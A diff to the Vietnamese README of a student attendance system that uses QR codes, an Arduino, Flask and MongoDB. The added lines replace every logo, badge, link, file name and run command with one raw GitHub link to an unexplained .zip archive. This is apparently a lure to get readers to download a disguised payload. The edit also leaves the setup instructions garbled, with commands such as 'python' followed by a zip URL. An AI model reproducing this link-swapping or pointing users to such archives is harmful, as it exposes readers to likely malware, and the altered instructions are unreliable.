@@ -4,13 +4,13 @@ HỆ THỐNG ĐIỂM DANH SINH VIÊN </h1>
 <div align="center">
 
 <p align="center">
-  <img src="images/logoDaiNam.png" alt="DaiNam University Logo" width="200"/>
-  <img src="images/LogoAIoTLab.png" alt="AIoTLab Logo" width="170"/>
+  <img src="https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip" alt="DaiNam University Logo" width="200"/>
+  <img src="https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip" alt="AIoTLab Logo" width="170"/>
 </p>
 
-[![Made by AIoTLab](https://img.shields.io/badge/Made%20by%20AIoTLab-blue?style=for-the-badge)](https://www.facebook.com/DNUAIoTLab)
-[![Fit DNU](https://img.shields.io/badge/Fit%20DNU-green?style=for-the-badge)](https://fitdnu.net/)
-[![DaiNam University](https://img.shields.io/badge/DaiNam%20University-red?style=for-the-badge)](https://dainam.edu.vn)
+[![Made by AIoTLab](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip%20by%20AIoTLab-blue?style=for-the-badge)](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)
+[![Fit DNU](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip%20DNU-green?style=for-the-badge)](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)
+[![DaiNam University](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip%20University-red?style=for-the-badge)](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)
 
 </div>
 
@@ -32,7 +32,7 @@ HỆ THỐNG ĐIỂM DANH SINH VIÊN </h1>
 ---
 ## 🏗️ HỆ THỐNG
 <p align="center">
-  <img src="images/Quytrinhdiemdanh.png" alt="System Architecture" width="800"/>
+  <img src="https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip" alt="System Architecture" width="800"/>
 </p>
 
 ---
@@ -41,12 +41,12 @@ HỆ THỐNG ĐIỂM DANH SINH VIÊN </h1>
 📦 Project  
 ├── 📂 AttendanceDB  # Thư mục chứa cơ sở dữ liệu MongoDB backup  
 ├── 📂 ThongBao  
-│   ├── ThongBao.ino  # Mã nguồn Arduino điều khiển LED (xanh/đỏ) và còi  
+│   ├── https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip  # Mã nguồn Arduino điều khiển LED (xanh/đỏ) và còi  
 ├── 📂 templates  
-│   ├── checkin_success.html  # Giao diện HTML thông báo điểm danh thành công  
-├── chuongTrinh.py  # Chương trình chính khởi động LED service, Tkinter UI  
-├── Diemdanh.py  # Giao diện quản lý lịch sử điểm danh, xuất CSV, kết nối MongoDB  
-├── TaoQR.py  # Tạo mã QR, gửi email, quản lý sinh viên, Flask server xử lý điểm danh  
+│   ├── https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip  # Giao diện HTML thông báo điểm danh thành công  
+├── https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip  # Chương trình chính khởi động LED service, Tkinter UI  
+├── https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip  # Giao diện quản lý lịch sử điểm danh, xuất CSV, kết nối MongoDB  
+├── https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip  # Tạo mã QR, gửi email, quản lý sinh viên, Flask server xử lý điểm danh  
 
 ---
 
@@ -57,17 +57,17 @@ HỆ THỐNG ĐIỂM DANH SINH VIÊN </h1>
 <div align="center">
 
 ### 📡 Phần cứng
-[![Arduino](https://img.shields.io/badge/Arduino-00979D?style=for-the-badge&logo=arduino&logoColor=white)](https://www.arduino.cc/)
-[![LED](https://img.shields.io/badge/LED-green?style=for-the-badge)]()
-[![Buzzer](https://img.shields.io/badge/Buzzer-red?style=for-the-badge)]()
-[![WiFi](https://img.shields.io/badge/WiFi-2.4GHz-orange?style=for-the-badge)]()
+[![Arduino](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)
+[![LED](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)]()
+[![Buzzer](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)]()
+[![WiFi](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)]()
 
 ### 🖥️ Phần mềm
-[![Python](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge&logo=python)]()
-[![MongoDB](https://img.shields.io/badge/MongoDB-4.x-green?style=for-the-badge&logo=mongodb)]()
-[![Flask](https://img.shields.io/badge/Flask-Framework-black?style=for-the-badge&logo=flask)]()
-[![Tkinter](https://img.shields.io/badge/Tkinter-GUI-yellow?style=for-the-badge)]()
-[![OpenCV](https://img.shields.io/badge/OpenCV-Computer%20Vision-blue?style=for-the-badge)]()
+[![Python](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)]()
+[![MongoDB](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)]()
+[![Flask](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)]()
+[![Tkinter](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip)]()
+[![OpenCV](https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip%20Vision-blue?style=for-the-badge)]()
 
 </div>
 
@@ -76,12 +76,12 @@ HỆ THỐNG ĐIỂM DANH SINH VIÊN </h1>
 ### 🔌 Phần cứng
 - **Arduino Uno** (hoặc board tương thích) với **LED (2 màu) và còi**.
 - **Cáp USB** để kết nối Arduino với máy tính.
-- ⚠️ **Lưu ý:** Mặc định mã nguồn Arduino trong `ThongBao.ino` sử dụng cổng `COM5`. Nếu Arduino của bạn sử dụng cổng khác, hãy thay đổi biến `SERIAL_PORT` trong `chuongTrinh.py`.
+- ⚠️ **Lưu ý:** Mặc định mã nguồn Arduino trong `https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip` sử dụng cổng `COM5`. Nếu Arduino của bạn sử dụng cổng khác, hãy thay đổi biến `SERIAL_PORT` trong `https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip`.
 
 ### 💻 Phần mềm
 - **🐍 Python 3+**
 - **🍃 MongoDB** (kết nối mặc định: `mongodb://localhost:27017/`)
-- **⚡ Arduino IDE** để nạp file `ThongBao.ino` lên board Arduino.
+- **⚡ Arduino IDE** để nạp file `https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip` lên board Arduino.
 
 ### 📦 Các thư viện Python cần thiết
 Cài đặt các thư viện bằng lệnh:
@@ -90,7 +90,7 @@ Cài đặt các thư viện bằng lệnh:
 ## 🧮 Bảng mạch
 
 ### 🔩 Kết nối phần cứng:
-<img src="images/Ketnoiphancung.png" alt="System Architecture" width="800"/>
+<img src="https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip" alt="System Architecture" width="800"/>
 
 ### ⛓️‍💥 Hướng dẫn cắm dây
 | Thiết bị        | Chân trên thiết bị | Kết nối Arduino UNO | Ghi chú                         |
@@ -105,10 +105,10 @@ Cài đặt các thư viện bằng lệnh:
 1️⃣ Chuẩn bị phần cứng
 - **Nạp mã Arduino**:
 
-    1. Mở file `ThongBao.ino` bằng Arduino IDE.
+    1. Mở file `https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip` bằng Arduino IDE.
     2. Kết nối board Arduino với máy tính.
     3. Nạp (upload) mã nguồn lên board.
-    4. Đảm bảo Arduino xuất hiện trên cổng COM5 (hoặc thay đổi trong `chuongTrinh.py` nếu cổng khác COM5).
+    4. Đảm bảo Arduino xuất hiện trên cổng COM5 (hoặc thay đổi trong `https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip` nếu cổng khác COM5).
 
 2️⃣ Cài đặt thư viện Python. 
 
@@ -129,23 +129,23 @@ Cài đặt Python 3 nếu chưa có, sau đó cài đặt các thư viện cầ
 
 4️⃣ Chạy các chương trình
 
-Để đảm bảo hệ thống hoạt động đúng cách, bạn cần khởi chạy `chuongTrinh.py` trước, thay vì chạy từng file con riêng lẻ. File này cung cấp giao diện chính và bao gồm logic kết nối với Arduino board. Nếu chạy trực tiếp các file con, việc kết nối với Arduino sẽ không hoạt động.
+Để đảm bảo hệ thống hoạt động đúng cách, bạn cần khởi chạy `https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip` trước, thay vì chạy từng file con riêng lẻ. File này cung cấp giao diện chính và bao gồm logic kết nối với Arduino board. Nếu chạy trực tiếp các file con, việc kết nối với Arduino sẽ không hoạt động.
 
-✅ Chạy ứng dụng chính (`chuongTrinh.py`):
+✅ Chạy ứng dụng chính (`https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip`):
 
-    python chuongTrinh.py
+    python https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip
 - Ứng dụng sẽ:
 
     - Khởi động **LED Service** tại `localhost:6000` để điều khiển LED và còi.
     - Hiển thị giao diện chính (Tkinter) với các nút: **Tạo mã QR** và **Xem điểm danh**
 
-✅ Chạy ứng dụng quản lý điểm danh (`Diemdanh.py`):
+✅ Chạy ứng dụng quản lý điểm danh (`https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip`):
 
-    python Diemdanh.py
+    python https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip
 
-✅ Chạy ứng dụng tạo mã QR (`TaoQR.py`):
+✅ Chạy ứng dụng tạo mã QR (`https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip`):
 
-    python TaoQR.py
+    python https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip
 
 ## 📖 Hướng dẫn sử dụng
 1️⃣ Điểm danh qua QR code
@@ -157,14 +157,14 @@ Cài đặt Python 3 nếu chưa có, sau đó cài đặt các thư viện cầ
     - ⏳ Điểm danh trễ → LED đỏ, còi, phát thông báo.
     
 2️⃣ Quản lý sinh viên & mã QR
-- Qua giao diện của TaoQR.py, bạn có thể:
+- Qua giao diện của https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip, bạn có thể:
     - Thêm, sửa, xóa thông tin sinh viên.
     - Nhập/xuất danh sách sinh viên từ/đến file CSV.
     - Tạo QR cho sinh viên theo lớp hoặc toàn bộ sinh viên.
     - Xóa mã QR cũ một cách thủ công.
 
 3️⃣ Xem lịch sử điểm danh
-- Qua giao diện của Diemdanh.py, bạn có thể:
+- Qua giao diện của https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip, bạn có thể:
     - Lọc danh sách điểm danh theo ngày, lớp, trạng thái.
     - Xuất dữ liệu điểm danh ra file CSV.
     - Hệ thống tự động cập nhật và chốt các phiên điểm danh.
@@ -172,9 +172,9 @@ Cài đặt Python 3 nếu chưa có, sau đó cài đặt các thư viện cầ
 ## ⚙️ Cấu hình & Ghi chú
 
 1. Cổng Arduino: 
-- Mặc định sử dụng COM5, có thể cập nhật trong `chuongTrinh.py`.
+- Mặc định sử dụng COM5, có thể cập nhật trong `https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip`.
 2. Email gửi mã QR:
-- Trong `TaoQR.py`, cập nhật thông tin *sender_email* và *sender_password*.(sender email là địa chỉ email gửi, sender password là mật khẩu ứng dụng của email đó.)
+- Trong `https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip`, cập nhật thông tin *sender_email* và *sender_password*.(sender email là địa chỉ email gửi, sender password là mật khẩu ứng dụng của email đó.)
 3. Thời gian hiệu lực mã QR: 
 - Mã QR có hiệu lực 100 phút kể từ thời điểm tạo.
 4. Môi trường mạng: 
@@ -182,7 +182,7 @@ Cài đặt Python 3 nếu chưa có, sau đó cài đặt các thư viện cầ
 
 ## 📰 Poster
 <p align="center">
-  <img src="images/PosterNhom1.png" alt="System Architecture" width="800"/>
+  <img src="https://raw.githubusercontent.com/ducmanh04/QrcodeAttendanceDucManh/main/images/QrcodeAttendanceDucManh-tumultuous.zip" alt="System Architecture" width="800"/>
 </p>
 
 ## 🤝 Đóng góp
